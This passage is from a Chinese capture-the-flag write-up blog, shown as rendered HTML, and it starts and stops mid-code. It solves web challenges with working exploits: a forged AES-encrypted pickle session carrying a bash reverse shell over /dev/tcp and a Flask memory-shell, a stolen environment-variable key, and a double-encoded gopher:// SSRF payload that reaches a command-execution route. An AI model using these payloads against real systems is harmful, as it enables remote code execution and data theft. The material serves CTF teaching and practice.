class="line"></span><br><span class="line"><span class="comment"># 将FLAG写入文件 请根据需要修改</span></span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$INSERT_FLAG</span> &gt; /f1wlxekj1lwjek1lkejzs1lwje1lwesjk1wldejlk1wcejl1kwjelk1wjcle1jklwecj1lkwcjel1kwjel1cwjl1jwlkew1jclkej1wlkcj1lkwej1lkcwjellag</span><br><span class="line"></span><br><span class="line"><span class="built_in">source</span> /etc/apache2/envvars</span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;Running...&quot;</span> &amp;</span><br><span class="line"></span><br><span class="line"><span class="built_in">tail</span> -F /var/log/apache2/* &amp;</span><br><span class="line"></span><br><span class="line"><span class="built_in">exec</span> apache2 -D FOREGROUND</span><br></pre></td></tr></table></figure><h2 id="ezzzz_pickle"><a class="markdownIt-Anchor" href="#ezzzz_pickle"></a> ezzzz_pickle</h2><p>直接爆破<strong>admin</strong>的密码得到<strong>admin123</strong></p><p><code>POST</code>参数发现可以<strong>任意文件读取</strong>，我们直接读<strong>源文件/app/app.py</strong><br />页面源代码还给了个提示，<strong>session_pickle</strong></p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment"># /app/app.py</span></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, redirect, make_response,render_template</span><br><span class="line"><span class="keyword">from</span> cryptography.hazmat.primitives.ciphers <span class="keyword">import</span> Cipher, algorithms, modes</span><br><span class="line"><span class="keyword">from</span> cryptography.hazmat.backends <span class="keyword">import</span> default_backend</span><br><span class="line"><span class="keyword">from</span> cryptography.hazmat.primitives <span class="keyword">import</span> padding</span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> hmac</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">generate_key_iv</span>():</span><br><span class="line">    key = os.environ.get(<span class="string">&#x27;SECRET_key&#x27;</span>).encode()</span><br><span class="line">    iv = os.environ.get(<span class="string">&#x27;SECRET_iv&#x27;</span>).encode()</span><br><span class="line">    <span class="keyword">return</span> key, iv</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">aes_encrypt_decrypt</span>(<span class="params">data, key, iv, mode=<span class="string">&#x27;encrypt&#x27;</span></span>):</span><br><span class="line"></span><br><span class="line">    cipher = Cipher(algorithms.AES(key), modes.CBC(iv), backend=default_backend())</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> mode == <span class="string">&#x27;encrypt&#x27;</span>:</span><br><span class="line">        encryptor = cipher.encryptor()</span><br><span class="line"></span><br><span class="line">        padder = padding.PKCS7(algorithms.AES.block_size).padder()</span><br><span class="line">        padded_data = padder.update(data.encode()) + padder.finalize()</span><br><span class="line">        result = encryptor.update(padded_data) + encryptor.finalize()</span><br><span class="line">        <span class="keyword">return</span> base64.b64encode(result).decode()  </span><br><span class="line"></span><br><span class="line">    <span class="keyword">elif</span> mode == <span class="string">&#x27;decrypt&#x27;</span>:</span><br><span class="line">        decryptor = cipher.decryptor()</span><br><span class="line"></span><br><span class="line">        encrypted_data_bytes = base64.b64decode(data)</span><br><span class="line">        decrypted_data = decryptor.update(encrypted_data_bytes) + decryptor.finalize()</span><br><span class="line"></span><br><span class="line">        unpadder = padding.PKCS7(algorithms.AES.block_size).unpadder()</span><br><span class="line">        unpadded_data = unpadder.update(decrypted_data) + unpadder.finalize()</span><br><span class="line">        <span class="keyword">return</span> unpadded_data.decode()</span><br><span class="line"></span><br><span class="line">users = &#123;</span><br><span class="line">    <span class="string">&quot;admin&quot;</span>: <span class="string">&quot;admin123&quot;</span>,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">create_session</span>(<span class="params">username</span>):</span><br><span class="line"></span><br><span class="line">    session_data = &#123;</span><br><span class="line">        <span class="string">&quot;username&quot;</span>: username,</span><br><span class="line">        <span class="string">&quot;expires&quot;</span>: time.time() + <span class="number">3600</span>  </span><br><span class="line">    &#125;</span><br><span class="line">    pickled = pickle.dumps(session_data)</span><br><span class="line">    pickled_data = base64.b64encode(pickled).decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    key,iv=generate_key_iv()</span><br><span class="line">    session=aes_encrypt_decrypt(pickled_data, key, iv,mode=<span class="string">&#x27;encrypt&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> session</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dowload_file</span>(<span class="params">filename</span>):</span><br><span class="line">    path=os.path.join(<span class="string">&quot;static&quot;</span>,filename)</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(path, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        data=f.read().decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> data</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">validate_session</span>(<span class="params">cookie</span>):</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        key, iv = generate_key_iv()</span><br><span class="line">        pickled = aes_encrypt_decrypt(cookie, key, iv,mode=<span class="string">&#x27;decrypt&#x27;</span>)</span><br><span class="line">        pickled_data=base64.b64decode(pickled)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        session_data = pickle.loads(pickled_data)</span><br><span class="line">        <span class="keyword">if</span> session_data[<span class="string">&quot;username&quot;</span>] !=<span class="string">&quot;admin&quot;</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> session_data <span class="keyword">if</span> session_data[<span class="string">&quot;expires&quot;</span>] &gt; time.time() <span class="keyword">else</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/&quot;</span>,methods=[<span class="string">&#x27;GET&#x27;</span>,<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;session&quot;</span> <span class="keyword">in</span> request.cookies:</span><br><span class="line">        session = validate_session(request.cookies[<span class="string">&quot;session&quot;</span>])</span><br><span class="line">        <span class="keyword">if</span> session:</span><br><span class="line">            data=<span class="string">&quot;&quot;</span></span><br><span class="line">            filename=request.form.get(<span class="string">&quot;filename&quot;</span>)</span><br><span class="line">            <span class="keyword">if</span>(filename):</span><br><span class="line">                data=dowload_file(filename)</span><br><span class="line">            <span class="keyword">return</span> render_template(<span class="string">&quot;index.html&quot;</span>,name=session[<span class="string">&#x27;username&#x27;</span>],file_data=data)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> redirect(<span class="string">&quot;/login&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/login&quot;</span>, methods=[<span class="string">&quot;GET&quot;</span>, <span class="string">&quot;POST&quot;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">login</span>():</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&quot;POST&quot;</span>:</span><br><span class="line">        username = request.form.get(<span class="string">&quot;username&quot;</span>)</span><br><span class="line">        password = request.form.get(<span class="string">&quot;password&quot;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> users.get(username) == password:</span><br><span class="line">            resp = make_response(redirect(<span class="string">&quot;/&quot;</span>))</span><br><span class="line"></span><br><span class="line">            resp.set_cookie(<span class="string">&quot;session&quot;</span>, create_session(username))</span><br><span class="line">            <span class="keyword">return</span> resp</span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">&quot;login.html&quot;</span>,error=<span class="string">&quot;Invalid username or password&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&quot;login.html&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/logout&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">logout</span>():</span><br><span class="line">    resp = make_response(redirect(<span class="string">&quot;/login&quot;</span>))</span><br><span class="line">    resp.delete_cookie(<span class="string">&quot;session&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> resp</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    app.run(host=<span class="string">&quot;0.0.0.0&quot;</span>,debug=<span class="literal">False</span>)</span><br></pre></td></tr></table></figure><p>通过<code>create_session()</code>函数，我们知道<strong>session数据</strong>经过了<strong>pickle序列化</strong>+<strong>base64编码</strong>+<strong>AES加密</strong></p><p>这里<code>aes加解密</code>需要<strong>key、iv</strong>，而且是从<strong>环境变量</strong>获取的，我们可以直接<strong>读/proc/self/environ</strong>，得到</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">PYTHON_SHA256=bfb249609990220491a1b92850a07135ed0831e41738cf681d63cf01b2a8fbd1</span><br><span class="line">HOSTNAME=ab49bc3fc05a4391</span><br><span class="line">PYTHON_VERSION=3.10.16</span><br><span class="line">PWD=/app</span><br><span class="line">HOME=/root</span><br><span class="line">LANG=C.UTF-8</span><br><span class="line">GPG_KEY=A035C8C19219BA821ECEA86B64E628F8D684696D</span><br><span class="line">FLAG=no_FLAG</span><br><span class="line">SECRET_key=ajwdopldwjdowpajdmslkmwjrfhgnbbv</span><br><span class="line">SHLVL=1</span><br><span class="line">PATH=/usr/local/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin</span><br><span class="line">SECRET_iv=asdwdggiouewhgpw</span><br><span class="line">_=/usr/local/bin/flask</span><br><span class="line">OLDPWD=/</span><br></pre></td></tr></table></figure><p>参照题目脚本，挫一下<code>exp</code>，因为没有回显，所以直接读是读不出来的</p><p>下面有三种方向，<strong>反弹shell、覆盖/追加写、内存马</strong></p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> cryptography.hazmat.primitives.ciphers <span class="keyword">import</span> Cipher, algorithms, modes</span><br><span class="line"><span class="keyword">from</span> cryptography.hazmat.backends <span class="keyword">import</span> default_backend</span><br><span class="line"><span class="keyword">from</span> cryptography.hazmat.primitives <span class="keyword">import</span> padding</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">aes_encrypt</span>(<span class="params">data, key, iv</span>):</span><br><span class="line"></span><br><span class="line">    cipher = Cipher(algorithms.AES(key), modes.CBC(iv),</span><br><span class="line">                    backend=default_backend())</span><br><span class="line">    encryptor = cipher.encryptor()</span><br><span class="line"></span><br><span class="line">    padder = padding.PKCS7(algorithms.AES.block_size).padder()</span><br><span class="line">    padded_data = padder.update(data.encode()) + padder.finalize()</span><br><span class="line">    result = encryptor.update(padded_data) + encryptor.finalize()</span><br><span class="line">    <span class="keyword">return</span> base64.b64encode(result).decode()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">key = <span class="string">b&#x27;ajwdopldwjdowpajdmslkmwjrfhgnbbv&#x27;</span></span><br><span class="line">iv = <span class="string">b&#x27;asdwdggiouewhgpw&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">data = <span class="string">b&#x27;&#x27;&#x27;(cos</span></span><br><span class="line"><span class="string">system</span></span><br><span class="line"><span class="string">S&#x27;bash -c &quot;bash -i &gt;&amp; /dev/tcp/ip/port 0&gt;&amp;1&quot;&#x27;</span></span><br><span class="line"><span class="string">o.&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">data = <span class="string">b&#x27;&#x27;&#x27;(cos</span></span><br><span class="line"><span class="string">system</span></span><br><span class="line"><span class="string">S&#x27;cat /flag* &gt; /app/app.py&#x27;</span></span><br><span class="line"><span class="string">o.&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">pickled_data = base64.b64encode(data).decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># class RCE():</span></span><br><span class="line"><span class="comment">#     def __reduce__(self):</span></span><br><span class="line"><span class="comment">#         return (exec, (&quot;global exc_class;global code;exc_class, code = app._get_exc_class_and_code(404);app.error_handler_spec[None][code][exc_class] = lambda a:__import__(&#x27;os&#x27;).popen(request.args.get(&#x27;cmd&#x27;)).read()&quot;,))</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># pickled_data = base64.b64encode(pickle.dumps(RCE())).decode(&#x27;utf-8&#x27;)</span></span><br><span class="line"></span><br><span class="line">session = aes_encrypt(pickled_data, key, iv)</span><br><span class="line">url = <span class="string">&#x27;http://node6.anna.nssctf.cn:24514/&#x27;</span></span><br><span class="line">res = requests.post(url, cookies=&#123;<span class="string">&#x27;session&#x27;</span>: session&#125;)</span><br><span class="line"><span class="built_in">print</span>(res.text)</span><br><span class="line"><span class="comment"># http://node6.anna.nssctf.cn:24514/xxx?cmd=ls /</span></span><br></pre></td></tr></table></figure><p>官方<code>wp</code>这里用的就是<a href="https://blog.csdn.net/2301_79724395/article/details/139094906">内存马</a></p><h2 id="goph3rrr"><a class="markdownIt-Anchor" href="#goph3rrr"></a> Goph3rrr</h2><p>什么信息都收集不到，直接<strong>扫目录</strong>，拿到<code>/app.py</code></p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, send_file, render_template_string</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">from</span> urllib.parse <span class="keyword">import</span> urlparse, urlunparse</span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line">BlackList = [</span><br><span class="line">    <span class="string">&quot;127.0.0.1&quot;</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;&#x27;&#x27; ... &#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/Login&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">login</span>():</span><br><span class="line">    junk_code()</span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&#x27;POST&#x27;</span>:</span><br><span class="line">        username = request.form.get(<span class="string">&#x27;username&#x27;</span>)</span><br><span class="line">        password = request.form.get(<span class="string">&#x27;password&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> username <span class="keyword">in</span> users <span class="keyword">and</span> users[username][<span class="string">&#x27;password&#x27;</span>] == hashlib.md5(password.encode()).hexdigest():</span><br><span class="line">            <span class="keyword">return</span> b64e(<span class="string">f&quot;Welcome back, <span class="subst">&#123;username&#125;</span>!&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> b64e(<span class="string">&quot;Invalid credentials!&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> render_template_string(<span class="string">&quot;&quot;&quot;...&quot;&quot;&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/Gopher&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">visit</span>():</span><br><span class="line">    url = request.args.get(<span class="string">&#x27;url&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> url <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;No url provided :)&quot;</span></span><br><span class="line">    url = urlparse(url)</span><br><span class="line">    realIpAddress = socket.gethostbyname(url.hostname)</span><br><span class="line">    <span class="keyword">if</span> url.scheme == <span class="string">&quot;file&quot;</span> <span class="keyword">or</span> realIpAddress <span class="keyword">in</span> BlackList:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;No (≧∇≦)&quot;</span></span><br><span class="line">    result = subprocess.run([<span class="string">&quot;curl&quot;</span>, <span class="string">&quot;-L&quot;</span>, urlunparse(url)], capture_output=<span class="literal">True</span>, text=<span class="literal">True</span>)</span><br><span class="line">    <span class="keyword">return</span> result.stdout</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/RRegister&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">register</span>():</span><br><span class="line">    junk_code()</span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&#x27;POST&#x27;</span>:</span><br><span class="line">        username = request.form.get(<span class="string">&#x27;username&#x27;</span>)</span><br><span class="line">        password = request.form.get(<span class="string">&#x27;password&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> username <span class="keyword">in</span> users:</span><br><span class="line">            <span class="keyword">return</span> b64e(<span class="string">&quot;Username already exists!&quot;</span>)</span><br><span class="line">        users[username] = &#123;<span class="string">&#x27;password&#x27;</span>: hashlib.md5(password.encode()).hexdigest()&#125;</span><br><span class="line">        <span class="keyword">return</span> b64e(<span class="string">&quot;Registration successful!&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> render_template_string(<span class="string">&quot;&quot;&quot;...&quot;&quot;&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/Manage&#x27;</span>, methods=[<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">cmd</span>():</span><br><span class="line">    <span class="keyword">if</span> request.remote_addr != <span class="string">&quot;127.0.0.1&quot;</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Forbidden!!!&quot;</span></span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&quot;GET&quot;</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Allowed!!!&quot;</span></span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&quot;POST&quot;</span>:</span><br><span class="line">        <span class="keyword">return</span> os.popen(request.form.get(<span class="string">&quot;cmd&quot;</span>)).read()</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/Upload&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">upload_avatar</span>():</span><br><span class="line">    junk_code()</span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&#x27;POST&#x27;</span>:</span><br><span class="line">        username = request.form.get(<span class="string">&#x27;username&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> username <span class="keyword">not</span> <span class="keyword">in</span> users:</span><br><span class="line">            <span class="keyword">return</span> b64e(<span class="string">&quot;User not found!&quot;</span>)</span><br><span class="line">        file = request.files.get(<span class="string">&#x27;avatar&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> file:</span><br><span class="line">            file.save(os.path.join(avatar_dir, <span class="string">f&quot;<span class="subst">&#123;username&#125;</span>.png&quot;</span>))</span><br><span class="line">            <span class="keyword">return</span> b64e(<span class="string">&quot;Avatar uploaded successfully!&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> b64e(<span class="string">&quot;No file uploaded!&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> render_template_string(<span class="string">&quot;&quot;&quot;...&quot;&quot;&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/app.py&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">download_source</span>():</span><br><span class="line">    <span class="keyword">return</span> send_file(__file__, as_attachment=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>, port=<span class="number">8000</span>)</span><br></pre></td></tr></table></figure><p>只需关注Gop<strong>her</strong>和<strong>Manage</strong>这两个路由，<strong>Gopher路由</strong>这里就无法使用<strong>file://协议</strong>直接实现读取，同时发现<strong>Manage路由</strong>可以实现<strong>命令执行</strong><code>os.popen(request.form.get(&quot;cmd&quot;)).read()</code></p><p>由于<strong>Gopher路由</strong>可以<strong>处理进程</strong>，那么我们的思路就是通过<strong>Gopher路由</strong>打<strong>SSRF</strong>到<strong>Manage路由</strong>，从而实现<strong>命令执行</strong></p><p>这里借助<strong>gopher://协议</strong>实现<strong>SSRF</strong></p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">gopher协议是一个古老且强大的协议，可以理解为是http协议的前身，他可以实现多个数据包整合发送。通过gopher协议可以攻击内网的 FTP、Telnet、Redis、Memcache，也可以进行 GET、POST 请求</span><br><span class="line"></span><br><span class="line">很多时候在SSRF下，我们无法通过HTTP协议来传递POST数据，这时候就需要用到gopher协议来发起POST请求了</span><br><span class="line"></span><br><span class="line">格式</span><br><span class="line">URL: gopher://&lt;host&gt;:&lt;port&gt;/&lt;gopher-path&gt;_后接TCP数据流</span><br><span class="line"></span><br><span class="line">注意不要忘记后面那个下划线<span class="string">&quot;_&quot;</span>，下划线<span class="string">&quot;_&quot;</span>后面才开始接TCP数据流，如果不加这个<span class="string">&quot;_&quot;</span>，那么服务端收到的消息将不是完整的，该字符可随意写</span><br></pre></td></tr></table></figure><p>同时注意<strong>Gopher路由</strong>这里还有<strong>解析</strong>为<strong>127.0.0.1</strong>的黑名单，下面有两种方式绕过</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="number">0</span>(缺省路由的写法也可以代表<span class="number">0.0</span><span class="number">.0</span><span class="number">.0</span>) <span class="number">0.0</span><span class="number">.0</span><span class="number">.0</span> 都代表本地</span><br><span class="line"><span class="number">127.</span>x.x.x 除了<span class="number">.1</span>都行，都是环回地址</span><br></pre></td></tr></table></figure><p>构造<strong>Manage路由</strong>的<strong>POST包</strong>，直接查看<strong>环境变量</strong></p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">POST /Manage HTTP/1.1</span><br><span class="line">host:127.0.0.1</span><br><span class="line">Content-Type:application/x-www-form-urlencoded</span><br><span class="line">Content-Length:7</span><br><span class="line"></span><br><span class="line">cmd=<span class="built_in">env</span></span><br></pre></td></tr></table></figure><p>题目代码中，<code>result = subprocess.run([&quot;curl&quot;, &quot;-L&quot;, urlunparse(url)], capture_output=True, text=True)</code>，因此我们这里需要<strong>二次URL编码</strong>(也是<strong>gopher协议</strong>的常见操作了)，同时题目代码这里也可以看见开放的是<strong>8000端口</strong></p><p><code>payload</code>如下：</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">/Gopher?url=gopher://0.0.0.0:8000/_POST%2520%252FManage%2520HTTP%252F1.1%250Ahost%253A127.0.0.1%250AContent-Type%253Aapplication%252Fx-www-form-urlencoded%250AContent-Length%253A7%250A%250Acmd%253Denv</span><br></pre></td></tr></table></figure><p>也发现了一个半自动化脚本吧</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> urllib.parse</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&quot;cmd=ls /&quot;</span></span><br><span class="line">payload_len = <span class="built_in">len</span>(payload)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">http_to_gopher</span>(<span class="params">http_request: <span class="built_in">str</span>, host: <span class="built_in">str</span>, port: <span class="built_in">int</span> = <span class="number">80</span></span>):</span><br><span class="line">    lines = http_request.split(<span class="string">&quot;\n&quot;</span>)</span><br><span class="line">    request_line = lines[<span class="number">0</span>].split()</span><br><span class="line">    method = request_line[<span class="number">0</span>]</span><br><span class="line">    path = request_line[<span class="number">1</span>]</span><br><span class="line">    headers = &#123;&#125;</span><br><span class="line">    body = <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> line <span class="keyword">in</span> lines[<span class="number">1</span>:]:</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> line.strip():</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;:&quot;</span> <span class="keyword">in</span> line:</span><br><span class="line">            key, value = line.split(<span class="string">&quot;:&quot;</span>, <span class="number">1</span>)</span><br><span class="line">            headers[key.strip()] = value.strip()</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            body = line.strip()</span><br><span class="line"></span><br><span class="line">    gopher_payload = <span class="string">f&quot;<span class="subst">&#123;method&#125;</span> <span class="subst">&#123;path&#125;</span> HTTP/1.1\r\n&quot;</span></span><br><span class="line">    gopher_payload += <span class="string">f&quot;Host: <span class="subst">&#123;host&#125;</span>:<span class="subst">&#123;port&#125;</span>\r\n&quot;</span></span><br><span class="line">    <span class="keyword">for</span> key, value <span class="keyword">in</span> headers.items():</span><br><span class="line">        gopher_payload += <span class="string">f&quot;<span class="subst">&#123;key&#125;</span>: <span class="subst">&#123;value&#125;</span>\r\n&quot;</span></span><br><span class="line">    <span class="keyword">if</span> body:</span><br><span class="line">        gopher_payload += <span class="string">f&quot;\r\n<span class="subst">&#123;body&#125;</span>&quot;</span></span><br><span class="line">    gopher_payload += <span class="string">&quot;\r\n\r\n&quot;</span></span><br><span class="line"></span><br><span class="line">    double_encoded_payload = urllib.parse.quote(urllib.parse.quote(gopher_payload))</span><br><span class="line">    gopher_url = <span class="string">f&quot;gopher://<span class="subst">&#123;host&#125;</span>:<span class="subst">&#123;port&#125;</span>/_<span class="subst">&#123;double_encoded_payload&#125;</span>&quot;</span></span><br><span class="line">    <span class="keyword">return</span> gopher_url</span><br><span class="line"></span><br><span class="line">http_request = <span class="string">f&quot;&quot;&quot;POST /Manage HTTP/1.1</span></span><br><span class="line"><span class="string">Host: 0.0.0.0:8000</span></span><br><span class="line"><span class="string">Content-Type: application/x-www-form-urlencoded</span></span><br><span class="line"><span class="string">Content-Length: <span class="subst">&#123;payload_len&#125;</span></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"><span class="subst">&#123;payload&#125;</span></span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(http_to_gopher(http_request, <span class="string">&quot;0.0.0.0&quot;</span>, <span class="number">8000</span>))</span><br></pre></td></tr></table></figure><h2 id="popppppp"><a class="markdownIt-Anchor" href="#popppppp"></a> Popppppp</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">CherryBlossom</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$fruit1</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$fruit2</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$a</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;fruit1 = <span class="variable">$a</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;fruit1;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$newFunc</span> = <span class="variable language_">$this</span>-&gt;fruit2;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$newFunc</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Forbidden</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$fruit3</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$string</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;fruit3 = <span class="variable">$string</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span 